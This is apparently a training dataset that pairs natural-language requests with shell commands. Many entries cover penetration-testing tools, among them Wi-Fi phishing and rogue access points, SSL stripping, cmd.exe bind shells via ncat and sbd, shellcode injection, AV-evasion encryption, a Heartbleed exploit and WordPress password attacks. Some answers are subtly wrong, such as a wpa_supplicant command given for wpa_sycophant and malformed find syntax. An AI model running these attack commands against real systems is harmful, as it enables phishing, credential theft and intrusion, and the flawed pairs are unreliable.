{"input": "Display the contents of a specific PHP webshell file named `cmd.php`", "answer": "cat /usr/share/webshells/php/cmd.php"}
{"input": "Search for all webshells that contain the keyword \"backdoor\" in their filenames", "answer": "find /usr/share/webshells -type f -name \"*backdoor*\""}
{"input": "Perform a web application fuzz test on the URL `http://example.com/FUZZ` using the wordlist `wordlist.txt` and hide responses with HTTP status code 404", "answer": "wfuzz -w wordlist.txt --hc 404 http://example.com/FUZZ"}
{"input": "Perform a recursive fuzz test on `http://example.com/FUZZ` with a maximum recursion depth of 3, using the wordlist `dirs.txt`", "answer": "wfuzz -w dirs.txt -R 3 http://example.com/FUZZ"}
{"input": "Perform a fuzz test on `http://example.com/FUZZ` using the wordlist `admin.txt` and use a proxy at `127.0.0.1:8080`", "answer": "wfuzz -w admin.txt -p 127.0.0.1:8080 http://example.com/FUZZ"}
{"input": "Perform a fuzz test on `http://example.com/FUZZ` using the wordlist `dirs.txt` and display verbose output with colored results", "answer": "wfuzz -w dirs.txt -c -v http://example.com/FUZZ"}
{"input": "Download all files from a website recursively, including images and other page requisites, and save them to a specific directory", "answer": "wget -r -p -P /path/to/save http://example.com"}
{"input": "Download a file from a URL and continue the download if it was interrupted", "answer": "wget -c http://example.com/largefile.zip"}
{"input": "Download all files from a website but exclude files with specific extensions like `.mp4` and `.zip`", "answer": "wget -r -R .mp4,.zip http://example.com"}
{"input": "Download a file from a URL and save it with a different name", "answer": "wget -O newfilename.zip http://example.com/oldfilename.zip"}
{"input": "Download a file from a URL and limit the download speed to 100KB/s", "answer": "wget --limit-rate=100k http://example.com/largefile.zip"}
{"input": "Download all files from a website but only up to a depth of 2 levels", "answer": "wget -r -l 2 http://example.com"}
{"input": "Download a file from a URL using a specific user agent string", "answer": "wget -U \"Mozilla/5.0\" http://example.com/file.zip"}
{"input": "Download a file from a URL and retry the download up to 5 times if it fails", "answer": "wget -t 5 http://example.com/file.zip"}
{"input": "Download a file from a URL and ignore the server's certificate validation", "answer": "wget --no-check-certificate http://example.com/file.zip"}
{"input": "Download a file from a URL and set a timeout of 10 seconds for all operations", "answer": "wget -T 10 http://example.com/file.zip"}
{"input": "Download a file from a URL and include a custom header in the HTTP request", "answer": "wget --header=\"Authorization: Bearer token\" http://example.com/file.zip"}
{"input": "Download a file from a URL and convert the links in the downloaded HTML file to point to local files", "answer": "wget -k http://example.com/index.html"}
{"input": "Paste the contents of the file \"log.txt\" to a pastebin service, setting the language to \"Python\" and the description to \"Error Logs\"", "answer": "wgetpaste -l Python -d \"Error Logs\" log.txt"}
{"input": "Paste the contents of \"data.txt\" to a pastebin service, setting the description to \"Test Data\" and using the \"snippets\" service", "answer": "wgetpaste -d \"Test Data\" -s snippets data.txt"}
{"input": "Retrieve all linker-related flags for embedding Python into a C application", "answer": "python-config --ldflags --embed"}
{"input": "Perform an aggressive scan on the website wired.com to detect detailed information about the technologies used", "answer": "whatweb -a 3 wired.com"}
{"input": "Scan the website example.com using a custom user agent to identify technologies", "answer": "whatweb -U \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" example.com"}
{"input": "Scan the website example.com and log the results in JSON format to a file named output.json", "answer": "whatweb --log-json=output.json example.com"}
{"input": "Scan the website example.com using a proxy server located at proxy.example.com on port 8080", "answer": "whatweb --proxy=proxy.example.com:8080 example.com"}
{"input": "Scan the website example.com and search for a specific string \"Powered by WordPress\" in the results", "answer": "whatweb --grep \"Powered by WordPress\" example.com"}
{"input": "Create a password hash using the SHA-256 method with a custom salt \"hashme\" and read the password from standard input", "answer": "mkpasswd -m sha256crypt -S hashme -s"}
{"input": "Perform a Wi-Fi phishing attack without deauthenticating clients, using the \"oem_login\" scenario, and ensure that NetworkManager is not killed during the attack", "answer": "wifiphisher -nD -kN -p oem_login"}
{"input": "Start a Wi-Fi phishing attack with the ESSID \"HotelGuest\", using the interface wlan4 for the rogue Access Point, and broadcast known beacon frames", "answer": "wifiphisher -aI wlan4 -e \"HotelGuest\" -kB"}
{"input": "Start a captive portal with the \"public\" template, serve static files from \"/usr/share/evilqr3/public\", listen on port 80, redirect users to \"https://publicwifi.com\", set the server address to \"172.16.0.1\", match user agents with \"Safari/14.0\", and use the API token \"publicToken456\"", "answer": "evilqr3 -t public -s /usr/share/evilqr3/public -p 80 -rU https://publicwifi.com -sa 172.16.0.1 -mu \"Safari/14.0\" -tp publicToken456"}
{"input": "Run EvilQR3 in debug mode with the \"custom\" template, serve static files from \"/opt/custom/static\", use port 7070, redirect users to \"https://customredirect.com\", set the server address to \"192.168.0.100\", match user agents with \"Edge/94.0\", and use the API token \"debugToken789\"", "answer": "evilqr3 -t custom -s /opt/custom/static -p 7070 -rU https://customredirect.com -sa 192.168.0.100 -mu \"Edge/94.0\" -tp debugToken789 -d"}
{"input": "Show the help menu for EvilQR3 to understand all available options", "answer": "evilqr3 -h"}
{"input": "Log all SSL and HTTP traffic, listen on port 12345, and kill sessions in progress using sslstrip3", "answer": "sslstrip3 -a -l 12345 -k"}
{"input": "Run wifipumpkin3 with a custom command string using the `--xpulp` flag to execute multiple commands separated by semicolons", "answer": "wifipumpkin3 --xpulp \"set ssid EvilAP; set channel 6; start\""}
{"input": "Use Wifite to attack only WPA-encrypted networks, capture new handshakes, and skip cracking previously captured handshakes", "answer": "wifite --wpa --new-hs --skip-crack"}
{"input": "Use Wifite to attack only WEP-encrypted networks and retain .IVS files for later use in cracking", "answer": "wifite --wep --keep-ivs"}
{"input": "Scan the website \"http://example.com\" using wig with 5 threads to speed up the process, and disable the search for subdomains", "answer": "wig -t 5 --no-subdomains http://example.com"}
{"input": "Use wig-ng to analyze a PCAP file named `test.pcap` with active mode and maximum verbosity", "answer": "wig-ng -a -vvv -r test.pcap"}
{"input": "Analyze a PCAP file named `test.pcap` using wig-ng.py with active mode and 5 concurrent processes", "answer": "wig-ng.py -a -c 5 -r test.pcap"}
{"input": "Process all PCAP files in the directory `captures/` using wig-ng.py with maximum verbosity and 6 concurrent processes", "answer": "wig-ng.py -vv -c 6 -R captures/"}
{"input": "Copy the `nc.exe` binary from the default directory to the current working directory for use in a penetration test", "answer": "cp /usr/share/windows-resources/binaries/nc.exe ."}
{"input": "List all available resources in the windows-resources directory", "answer": "ls /usr/share/windows-resources"}
{"input": "Navigate to the Mimikatz directory within the windows-resources folder", "answer": "cd /usr/share/windows-resources/mimikatz"}
{"input": "Run the Shellter tool from the windows-resources directory to perform dynamic shellcode injection", "answer": "wine /usr/share/windows-resources/shellter/shellter.exe"}
{"input": "Use the Hyperion tool from the windows-resources directory to encrypt a Windows executable", "answer": "wine /usr/share/windows-resources/hyperion/hyperion.exe target.exe encrypted_target.exe"}
{"input": "Use the SBD tool from the windows-resources directory to create a bind shell on port 5555", "answer": "wine /usr/share/windows-resources/sbd/sbd.exe -l -p 5555 -e cmd.exe"}
{"input": "Use the Heartleech tool from the windows-resources directory to exploit a Heartbleed vulnerability", "answer": "wine /usr/share/windows-resources/heartleech/heartleech.exe"}
{"input": "Use the Ncat tool from the windows-resources directory to listen on port 1234 and execute a command when a connection is received", "answer": "wine /usr/share/windows-resources/ncat/ncat.exe -l -p 1234 -e cmd.exe"}
{"input": "Capture all network traffic on interface eth0 and display the packet details in a human-readable format", "answer": "tshark -i eth0 -V"}
{"input": "Capture traffic on interface eth1 and display the packet bytes in hexadecimal format", "answer": "tshark -i eth1 -x"}
{"input": "Capture traffic on interface eth0 and stop after 60 seconds", "answer": "tshark -i eth0 -a duration:60"}
{"input": "Capture traffic on interface eth0 and display the packet summary along with the packet details", "answer": "tshark -i eth0 -P -V"}
{"input": "Read a capture file `traffic.pcap` and display only TCP packets with the destination port 80", "answer": "tshark -r traffic.pcap -Y \"tcp.dstport == 80\""}
{"input": "Capture traffic on interface eth0 and display only the source and destination IP addresses", "answer": "tshark -i eth0 -T fields -e ip.src -e ip.dst"}
{"input": "Capture traffic on interface eth0 and display the output in a tab-separated format", "answer": "tshark -i eth0 -T tabs"}
{"input": "Capture traffic on interface eth0 and display only UDP packets", "answer": "tshark -i eth0 -Y \"udp\""}
{"input": "Capture traffic on interface eth0 and display only packets with the source port 443", "answer": "tshark -i eth0 -Y \"tcp.srcport == 443\""}
{"input": "Read a capture file `traffic.pcap` and display only packets with the TCP SYN flag set", "answer": "tshark -r traffic.pcap -Y \"tcp.flags.syn == 1\""}
{"input": "Read a previously saved capture file `traffic.pcap` and apply a display filter to show only DNS traffic", "answer": "wireshark -r traffic.pcap -Y \"dns\""}
{"input": "Read a capture file `traffic.pcap` and decode TCP port 8888 as HTTP traffic", "answer": "wireshark -r traffic.pcap -d tcp.port==8888,http"}
{"input": "Read a capture file `traffic.pcap` and display only packets with a source IP of `192.168.1.1`", "answer": "wireshark -r traffic.pcap -Y \"ip.src == 192.168.1.1\""}
{"input": "Read a capture file `traffic.pcap` and display only packets with a destination port of 443", "answer": "wireshark -r traffic.pcap -Y \"tcp.dstport == 443\""}
{"input": "Read a capture file `traffic.pcap` and display only packets with a TCP SYN flag set", "answer": "wireshark -r traffic.pcap -Y \"tcp.flags.syn == 1\""}
{"input": "Read a capture file `traffic.pcap` and display only packets with a length greater than 100 bytes", "answer": "wireshark -r traffic.pcap -Y \"frame.len > 100\""}
{"input": "Display all available information about the capture file `example.pcap`", "answer": "capinfos example.pcap"}
{"input": "Capture packets on interface eth0 for 30 seconds and save the output to `duration_capture.pcapng`", "answer": "dumpcap -i eth0 -a duration:30 -w duration_capture.pcapng"}
{"input": "Capture 100 packets on interface eth0 and save them to `packet_count_capture.pcapng`", "answer": "dumpcap -i eth0 -c 100 -w packet_count_capture.pcapng"}
{"input": "Capture traffic on interface eth0 and add a comment \"Test Capture\" to the output file `commented_capture.pcapng`", "answer": "dumpcap -i eth0 -w commented_capture.pcapng --capture-comment \"Test Capture\""}
{"input": "Capture traffic on interface eth0 and stop after capturing 500 packets or 60 seconds, whichever comes first", "answer": "dumpcap -i eth0 -c 500 -a duration:60 -w mixed_stop_capture.pcapng"}
{"input": "Remove duplicate packets from the input file \"input.pcap\" and save the result to \"output.pcap\" using a duplicate window of 10 packets", "answer": "editcap -D 10 input.pcap output.pcap"}
{"input": "Add a capture file comment \"Test Capture\" to \"input.pcap\" and save the result to \"output.pcap\"", "answer": "editcap --capture-comment \"Test Capture\" input.pcap output.pcap"}
{"input": "Merge two capture files, `input1.pcap` and `input2.pcap`, into a single file named `final_output.pcap` while preserving all IDBs and setting the output format to `pcap`", "answer": "mergecap -w final_output.pcap -F pcap -I all input1.pcap input2.pcap"}
{"input": "Merge two capture files, `net1.pcap` and `net2.pcap`, into a single file named `network_output.pcap` while preserving all IDBs and compressing the output using gzip", "answer": "mergecap -w network_output.pcap net1.pcap net2.pcap && gzip network_output.pcap"}
{"input": "Create 1000 Ethernet packets with a maximum size of 1500 bytes each and save them to \"ethernet_packets.pcap\"", "answer": "randpkt -t eth -c 1000 -b 1500 ethernet_packets.pcap"}
{"input": "Start sharkd with a configuration profile named \"secure_profile\" and listen on a Unix socket at `/tmp/sharkd_secure.sock`", "answer": "sharkd -a unix:/tmp/sharkd_secure.sock -C secure_profile"}
{"input": "Run sharkd and listen for API connections on TCP port 4446 at the localhost IP address 127.0.0.1", "answer": "sharkd -a tcp:127.0.0.1:4446"}
{"input": "Start sharkd and listen on a Unix socket at `/tmp/sharkd_custom.sock` using a configuration profile named \"network_analysis\"", "answer": "sharkd -a unix:/tmp/sharkd_custom.sock -C network_analysis"}
{"input": "Generate a pcap file `output.pcap` from a hexdump in `input.txt` with a dummy TCP header using source port `50` and destination port `60`", "answer": "text2pcap -T 50,60 input.txt output.pcap"}
{"input": "Create a pcap file `output.pcap` from a hexdump in `input.txt` with a dummy IPv6 header using source IP `2001:db8::1` and destination IP `2001:db8::2`", "answer": "text2pcap -6 2001:db8::1,2001:db8::2 input.txt output.pcap"}
{"input": "Create a pcap file `output.pcap` from a hexdump in `input.txt` with a dummy SCTP DATA chunk header using source port `30`, destination port `40`, and payload protocol identifier `34`", "answer": "text2pcap -S 30,40,34 input.txt output.pcap"}
{"input": "Convert a hexdump file `input.txt` into a pcap file `output.pcap` with a dummy UDP header and compress the output using gzip", "answer": "text2pcap -u 1234,80 input.txt output.pcap && gzip output.pcap"}
{"input": "Capture screenshots of all web services on the IP range 10.1.1.1-10.1.1.15 with 15 concurrent browser tabs and a timeout of 10 seconds", "answer": "witnessme screenshot --threads 15 --timeout 10 10.1.1.1-10.1.1.15"}
{"input": "Generate a new wordlist `output.txt` from `input.txt`, including only words that contain numbers and have a minimum length of 10", "answer": "grep -E '[0-9]' input.txt | awk 'length >= 10' > output.txt"}
{"input": "Create a target wordlist `filtered.txt` from `source.txt`, ensuring the words include special characters and have a maximum length of 15", "answer": "grep '[^a-zA-Z0-9]' source.txt | awk 'length <= 15' > filtered.txt"}
{"input": "Generate a wordlist `final.txt` from `base.txt`, ensuring the words are exactly 8 characters long and include numbers", "answer": "grep -E '^[a-zA-Z0-9]{8}$' base.txt > final.txt"}
{"input": "List all available wordlists in the default directory", "answer": "ls /usr/share/wordlists"}
{"input": "Search for a specific wordlist related to SQL injection attacks", "answer": "find /usr/share/wordlists -name \"*sql*\""}
{"input": "Copy the `rockyou.txt` wordlist to my current working directory for easier access", "answer": "cp /usr/share/wordlists/rockyou.txt ./"}
{"input": "Combine the `rockyou.txt` and `fasttrack.txt` wordlists into a single file for a larger wordlist", "answer": "cat /usr/share/wordlists/rockyou.txt /usr/share/wordlists/fasttrack.txt > combined_wordlist.txt"}
{"input": "Search for a wordlist related to Wi-Fi password cracking", "answer": "find /usr/share/wordlists -name \"*wifi*\""}
{"input": "Check the size of the `rockyou.txt.gz` file before extracting it", "answer": "du -h /usr/share/wordlists/rockyou.txt.gz"}
{"input": "Search for a wordlist related to DNS enumeration", "answer": "find /usr/share/wordlists -name \"*dns*\""}
{"input": "Create an SQLite database containing all keys from the Web of Trust using wotmate", "answer": "wotmate --all --make-sqlitedb wot_keys.db"}
{"input": "Execute wpa_sycophant with a custom configuration file located at `/etc/wpa-sycophant/special_config.conf` on the wireless interface `wlan5`", "answer": "sudo wpa_sycophant -c /etc/wpa-sycophant/special_config.conf -i wlan5"}
{"input": "Start wpa_sycophant with the default configuration file on the wireless interface `wlan6`", "answer": "sudo wpa_supplicant -c /etc/wpa_supplicant/wpa_supplicant.conf -i wlan6"}
{"input": "Scan the WordPress site at `https://blog.example.com` for vulnerable plugins and themes, and use an API token to fetch vulnerability data", "answer": "wpscan --url https://blog.example.com --enumerate vp,vt --api-token YOUR_API_TOKEN"}
{"input": "Scan the WordPress site at `http://10.0.0.5` with aggressive detection mode, and exclude usernames matching `admin` or `test`", "answer": "wpscan --url http://10.0.0.5 --detection-mode aggressive --exclude-usernames \"admin|test\""}
{"input": "Scan the WordPress site at `https://mysite.com` with a custom login page at `/login`, and use a list of passwords from `passwords.txt` for a password attack", "answer": "wpscan --url https://mysite.com --login-uri /login --passwords passwords.txt"}
{"input": "Scan the WordPress site at `http://192.168.0.10` with verbose output, and enumerate popular plugins and themes", "answer": "wpscan --url http://192.168.0.10 --verbose --enumerate p,t"}
{"input": "Scan the WordPress site at `http://10.10.10.1` with a custom wp-content directory named `content`, and enumerate all plugins and users", "answer": "wpscan --url http://10.10.10.1 --wp-content-dir content --enumerate ap,u"}
{"input": "Scan the WordPress site at `https://example.net` with a request timeout of 90 seconds, and enumerate config backups and database exports", "answer": "wpscan --url https://example.net --request-timeout 90 --enumerate cb,dbe"}
{"input": "Start a WebDAV server on port 8080, accessible from any IP address, and share the folder `/var/www/html` for anonymous access", "answer": "wsgidav --port=8080 --host=0.0.0.0 --root=/var/www/html --auth=anonymous"}
{"input": "Run a WebDAV server on port 80, accessible only from the local machine, and use the configuration file `~/my_wsgidav_config.yaml`", "answer": "wsgidav --port=80 --host=localhost --config=~/my_wsgidav_config.yaml"}
{"input": "Run a WebDAV server on port 8080 with verbose logging, and do not load any default configuration files", "answer": "wsgidav --port=8080 --host=0.0.0.0 --verbose --no-config"}
{"input": "Start a WebDAV server on port 8080, use the `builtin` SSL adapter, and share the folder `/home/user/shared`", "answer": "wsgidav --port=8080 --host=0.0.0.0 --root=/home/user/shared --ssl-adapter=builtin"}
{"input": "Mount a raw disk image located at `/images/disk.img` to the mount point `/mnt/disk` using xmount, enabling debug mode for troubleshooting", "answer": "xmount -d --in raw /images/disk.img /mnt/disk"}
{"input": "Mount a VDI image located at `/images/vm.vdi` to `/mnt/vm` using xmount, and specify a cache file at `/cache/vm.cache` for virtual write support", "answer": "xmount --in vdi /images/vm.vdi --cache /cache/vm.cache /mnt/vm"}
{"input": "Mount a raw disk image located at `/images/disk.img` to `/mnt/disk` using xmount, and apply a RAID0 morphing function with a chunk size of 256KB", "answer": "xmount --in raw /images/disk.img --morph raid0 --morphopts \"raid_chunksize=262144\" /mnt/disk"}
{"input": "Mount a raw disk image located at `/images/disk.img` to `/mnt/disk` using xmount, and disable the automatic addition of FUSE's `allow_other` option", "answer": "xmount -o no_allow_other --in raw /images/disk.img /mnt/disk"}
{"input": "Mount a raw disk image located at `/images/disk.img` to `/mnt/disk` using xmount, and specify a read-only cache file at `/cache/disk.cache`", "answer": "xmount --in raw /images/disk.img --rocache /cache/disk.cache /mnt/disk"}
{"input": "Run mfbc with a custom configuration file named `traffic_config.cfg`, provide detailed information about the PEI generated by the manipulator, and connect to port 7070", "answer": "mfbc -c traffic_config.cfg -i -p 7070"}
{"input": "Run mfile in silent mode, display PEI information, and connect to port 9000 using the configuration file \"settings.cfg\"", "answer": "mfile -s -i -c settings.cfg -p 9000"}
{"input": "Terminate the Apache and Xplico services with a single command using xplico-webui-stop", "answer": "sudo systemctl stop apache2 && sudo systemctl stop xplico"}
{"input": "Use xplico-webui-stop to stop all active services, including Apache and Xplico", "answer": "sudo systemctl stop xplico && sudo systemctl stop apache2"}
{"input": "Scan `https://example.com` for CSRF vulnerabilities, use a custom user-agent `Mozilla/5.0`, and skip the Proof of Concept (PoC) form generation", "answer": "xsrfprobe -u https://example.com --user-agent \"Mozilla/5.0\" --skip-poc"}
{"input": "Test `https://example.com` for CSRF vulnerabilities, set a timeout of 5 seconds for each request, and increase the verbosity of the output", "answer": "xsrfprobe -u https://example.com --timeout 5 -v"}
{"input": "Scan `https://example.com` for CSRF vulnerabilities, use random user-agents for requests, and skip the post-scan token analysis", "answer": "xsrfprobe -u https://example.com --random-agent --no-analysis"}
{"input": "Perform a CSRF scan on `https://example.com`, generate a malicious CSRF form, and do not verify SSL certificates", "answer": "xsrfprobe -u https://example.com --malicious --no-verify"}
{"input": "Scan the target URL \"https://example.com/login\" for XSS vulnerabilities using XSSer and save the results to an XML file", "answer": "xsser -u \"https://example.com/login\" --xml=\"xss_report.xml\""}
{"input": "Perform an XSS audit on the target URL \"https://example.com/contact\" using XSSer, and follow server redirections up to 10 times", "answer": "xsser -u \"https://example.com/contact\" --follow-redirects --follow-limit=10"}
{"input": "Use XSSer to scan the target URL \"https://example.com/profile\" for XSS vulnerabilities, and use a custom User-Agent header for the request", "answer": "xsser -u \"https://example.com/profile\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\""}
{"input": "Scan the file `malware.exe` using the YARA rules file `malware_rules.yar` and print statistics about the rules used during the scan", "answer": "yara -S malware_rules.yar malware.exe"}
{"input": "Scan the directory `/home/user/documents` using the YARA rules file `malware_rules.yar` and use 4 threads to speed up the scanning process", "answer": "yara -p 4 malware_rules.yar /home/user/documents"}
{"input": "Compile a YARA rule file `custom_rules.yar` into `custom_rules.yarc` using a custom atom quality table located at `/path/to/atom_table.txt`", "answer": "yarac --atom-quality-table=/path/to/atom_table.txt custom_rules.yar custom_rules.yarc"}
{"input": "Compile a YARA rule file `advanced_rules.yar` into `advanced_rules.yarc` using a custom atom quality table at `/data/atom_table.txt`, setting the maximum number of strings per rule to 2000, and treating warnings as errors", "answer": "yarac --atom-quality-table=/data/atom_table.txt --max-strings-per-rule=2000 --fail-on-warnings advanced_rules.yar advanced_rules.yarc"}
{"input": "Launch Yersinia in interactive mode to perform attacks on the Spanning Tree Protocol (STP)", "answer": "yersinia -I stp"}
{"input": "Run a full scan on the target website `http://example.com` using ZAP, including all available tests, and specify a custom API key `1234567890`", "answer": "zap-full-scan.py -t http://example.com -a -z \"-config api.key=1234567890\""}
{"input": "Zero out all free blocks on the ext3 filesystem located at `/dev/sdb2` and display verbose output during the process", "answer": "zerofree -v /dev/sdb2"}
{"input": "Zero out all free blocks on the ext4 filesystem located at `/dev/sdd1` without actually writing to the disk (dry run)", "answer": "zerofree -n /dev/sdd1"}
{"input": "Start a Zim web server for the notebook located at `/home/user/notes` on port 9090, serving only to localhost", "answer": "zim --server --port=9090 --private /home/user/notes"}
{"input": "Open the Zim user manual in the GUI", "answer": "zim"}
{"input": "Enable the `--autocd` option to automatically change directories by typing their names", "answer": "echo 'setopt autocd' >> ~/.zshrc && source ~/.zshrc"}
{"input": "Enable the `--autopushd` option to automatically push directories onto the directory stack when changing directories", "answer": "setopt autopushd"}
{"input": "Run a Zsh shell with extended globbing enabled to allow more advanced pattern matching", "answer": "zsh -o extendedglob"}
{"input": "Run a Zsh shell with the option to enable verbose mode, printing each command before executing it", "answer": "zsh -o verbose"}
{"input": "Run a Z shell script with the `errexit` option enabled to exit immediately if a command fails", "answer": "zsh -e script.sh"}
{"input": "Start a Z shell session with the `promptsubst` option enabled to allow prompt string substitution", "answer": "zsh -c 'setopt promptsubst; exec zsh'"}
{"input": "Run a Z shell script with the `xtrace` option enabled to print each command before execution", "answer": "zsh -x script.sh"}
{"input": "Display all lines containing \"IP_MROUTE\" in the current kernel's compile-time config file", "answer": "cat /boot/config-`uname -r` | grep IP_MROUTE"}
{"input": "Display current running kernel's compile-time config file", "answer": "cat /boot/config-`uname -r`"}
{"input": "Find all loadable modules for current kernel, whose name includes \"perf\"", "answer": "find /lib/modules/`uname -r` -regex .*perf.*"}
{"input": "Look for any instance of \"HIGHMEM\" in the current kernel's compile-time config file", "answer": "grep 'HIGHMEM' /boot/config-`uname -r`"}
{"input": "Search for command \"tail\" in the maps of the process with PID 2671", "answer": "cat /proc/2671/maps | grep `which tail`"}
{"input": "Display all lines containing PROBES in the current kernel's compile-time config file", "answer": "grep PROBES /boot/config-$(uname -r)"}
{"input": "Look for any instance of \"ds1337\" in the modules.alias file matching current kernel release", "answer": "grep ds1337 /lib/modules/`uname -r`/modules.alias"}
{"input": "A no-op on filename with sed", "answer": "sed -i \"s/\\\\\\\\\\n//g\" filename"}
{"input": "Add \"Line of text here\" on top of each *.py files under current directory", "answer": "find . -name \\*.py -print0 | xargs -0 sed -i '1a Line of text here'"}
{"input": "Add \"new.\" to the beginning of the name of \"original.filename\", renaming it to \"new.original.filename\"", "answer": "rename 's/(.*)$/new.$1/' original.filename"}
{"input": "Add \"prefix\" to every non-blank line in \"file.txt\"", "answer": "nl -s prefix file.txt | cut -c7-"}
{"input": "Add \"prefix_\" to every non-blank line in \"a.txt\"", "answer": "nl -s \"prefix_\" a.txt | cut -c7-"}
{"input": "Add '.avi' extension to all files/directories with '.mkv' extension under '/volume1/uploads' directory tree", "answer": "find /volume1/uploads -name \"*.mkv\" -exec mv \\{\\} \\{\\}.avi \\;"}
{"input": "Add a cron job to existing list, without removing existing ones, ro tun \"scripty.sh\" at 2:01 am, 3rd day of april (4th month), if that day happens to be a friday (5th day of the week starting with sunday=0)", "answer": "cat <(crontab -l) <(echo \"1 2 3 4 5 scripty.sh\") | crontab -"}
{"input": "Add a date time stamp to every line of output in \"ping google.com\"", "answer": "ping google.com | xargs -L 1 -I '{}' date '+%c: {}'"}
{"input": "Add a line number to every line in \"infile\"", "answer": "nl -ba infile"}
{"input": "Add a line number to every line in \"long-file\"", "answer": "nl -ba long-file \\"}
{"input": "Add content of \"filename\" to the existing cron jobs of user \"user\", without removing the previously existing cron jobs", "answer": "crontab -l -u user | cat - filename | crontab -u user -"}
{"input": "Add cron lists from \"file1\" and \"file2\" to list of cron jobs, giving errors for any lines that cannot be parsed by crontab", "answer": "cat file1 file2 | crontab"}
{"input": "Add executable permission to \"java_ee_sdk-6u2-jdk-linux-x64.sh\"", "answer": "sudo chmod +x java_ee_sdk-6u2-jdk-linux-x64.sh"}
{"input": "Add group write permission to all files and directories in the current directory including hidden files and excluding \"..\"", "answer": "chmod g+w $(ls -1a | grep -v '^..$')"}
{"input": "Add group write permission to all files in the current directory", "answer": "find . -maxdepth 0 -type f -exec chmod g+w {} ';'"}
{"input": "Add group write permission to all files matching \"*\" or \"...*\"", "answer": "chmod g+w * ...*"}
{"input": "Add line numbers to each non-blank line in \"file\" starting with number 1000001", "answer": "nl -v1000001 file"}
{"input": "Add newline before all 2nd and consequent occurrences of '3d3d' in file 'temp' and write each line from the output to files with prefix 'temp' and numeric suffixes", "answer": "sed 's/3d3d/\\n&/2g' temp | split -dl1 - temp"}
{"input": "Add prefix like number and \"^M${LOGFILE}> \" to every non-blank line received on standard input", "answer": "nl -s\"^M${LOGFILE}>  \""}
{"input": "Add read and execute permission to command \"node\"", "answer": "sudo chmod +rx $(which node)"}
{"input": "Add read permission for 'other' for all files/directories named 'rc.conf' under current directory tree", "answer": "find . -name \"rc.conf\" -exec chmod o+r '{}' \\;"}
{"input": "Add the .abc suffix to the names of all *.txt regular files in the current directory tree", "answer": "find . -type f -iname '*.txt' -print0 | xargs -0 mv {} {}.abc"}
{"input": "Add the execute and read permission for all and the write permission for the user to the dir_data directory and all of its sub-directories", "answer": "find ~/dir_data -type d -exec chmod a+xr,u+w {} \\;"}
{"input": "Add variable 'v' with value '5' to a temporary environment, list this environment using 'less' to interactively view it", "answer": "v=5 env|less"}
{"input": "Add variable TESTVAR with value \"bbb\" to a temporary environment, and search for TESTVAR in all variables and their values in the resulting environment", "answer": "TESTVAR=bbb env | fgrep TESTVAR"}
{"input": "Adjust the timestamp of 'filename' by subtracting 2 hours from it", "answer": "touch -d \"$(date -r filename) - 2 hours\" filename"}
{"input": "Adjust the timestamp of file $filename by subtracting 2 hours from it", "answer": "touch -d \"$(date -r \"$filename\") - 2 hours\" \"$filename\""}
{"input": "Allow anyone to run command \"Xvfb\" as the owner of \"Xvfb\"", "answer": "sudo chmod u+s `which Xvfb`"}
{"input": "Answer \"n\" to any prompts in the interactive recursive removal of \"dir1\", \"dir2\", and \"dir3\"", "answer": "yes n | rm -ir dir1 dir2 dir3"}
{"input": "Answer \"y\" to all prompts of \"rm -rf foo\"", "answer": "yes | rm -ri foo"}
{"input": "Answer \"y\" to any prompts in the interactive recursive removal of \"dir1\", \"dir2\", and \"dir3\"", "answer": "yes y | rm -ir dir1 dir2 dir3"}
{"input": "Append \"& Bytes\" to the end of every line in \"$TEMPFILE\" and format the result as a table", "answer": "sed 's/.*/& Bytes/' \"$TEMPFILE\" | column -t"}
{"input": "Append \".txt\" to all filenames in the current directory tree", "answer": "find -type f | xargs -I {} mv {} {}.txt"}
{"input": "Append \"<br/>\" to the end of each line in \"1\\n2\\n3\"", "answer": "echo -e \"1\\n2\\n3\" | sed 's/.*$/&<br\\/>/'"}
{"input": "Append \"\\r\" on each line of file \"input\" and display the printable characters", "answer": "sed 's/$/\\r/g' input |od -c"}
{"input": "Append \"foo\" and \"bar\" column in file \"file\" with values dependent on the current table contents", "answer": "awk 'NR==1 {print $0, \"foo\", \"bar\"; next} {print $0, ($2==\"x\"?\"-\":\"x\"), ($4==\"x\"?\"-\":\"x\")}' file | column -t"}
{"input": "Append *.java files from the current directory tree to tar archive `myfile.tar'", "answer": "find . -type f -name \"*.java\" | xargs tar rvf myfile.tar"}
{"input": "Append all *.mp3 files modified within the last 180 days to tar archive `music.tar'", "answer": "find . -name -type f '*.mp3' -mtime -180 -print0 | xargs -0 tar rvf music.tar"}
{"input": "Append all PNG and JPG files to tar archive 'images.tar'", "answer": "find . \\( -iname \"*.png\" -o -iname \"*.jpg\" \\) -print -exec tar -rf images.tar {} \\;"}
{"input": "Append all regular files modified in the last 24 hours to the \"$archive.tar\" tar archive", "answer": "find . -mtime -1 -type f -exec tar rvf \"$archive.tar\" '{}' \\;"}
{"input": "Append the contents of \"file.txt\" to the current in-memory history list", "answer": "history -r file.txt"}
{"input": "Append the current date in '%Y%m%d_%H%M' format with the basename of $0 and save it to variable 'LOGNAME'", "answer": "LOGNAME=\"`basename \"$0\"`_`date \"+%Y%m%d_%H%M\"`\""}
{"input": "Append the current date to variable 'LBUFFER'", "answer": "LBUFFER+=\"$(date)\""}
{"input": "Append the date and command ran to \"/tmp/trace\" after every command", "answer": "PROMPT_COMMAND='echo \"$(date +\"%Y/%m/%d (%H:%M)\") $(history 1 |cut -c 7-)\" >> /tmp/trace'"}
{"input": "Append the last modification time of file $arg as the seconds since epoch with a preceding space to the variable 'KEY'", "answer": "KEY+=`date -r \"$arg\" +\\ %s`"}
{"input": "Append the parent directory name with a space in all 'text.txt' files in all sub directories of current directory", "answer": "find . -name text.txt | sed 's|.*/\\(.*\\)/.*|sed -i \"s@^@\\1 @\" & |' | sh"}
{"input": "Archive \"./dir\" to \"user@host:/path\" via ssh on port 2222 and display progress", "answer": "rsync -rvz -e 'ssh -p 2222' --progress ./dir user@host:/path"}
{"input": "Archive \"./htmlguide\" to \"~/src/\" with resolved symbolic links and delete any extraneous files from \"~/src/\" not found in \"./htmlguide\"", "answer": "rsync -av --copy-dirlinks --delete ../htmlguide ~/src/"}
{"input": "Archive \"/home/abc/*\" to \"/mnt/windowsabc\" with human readable output", "answer": "rsync -avh /home/abc/* /mnt/windowsabc"}
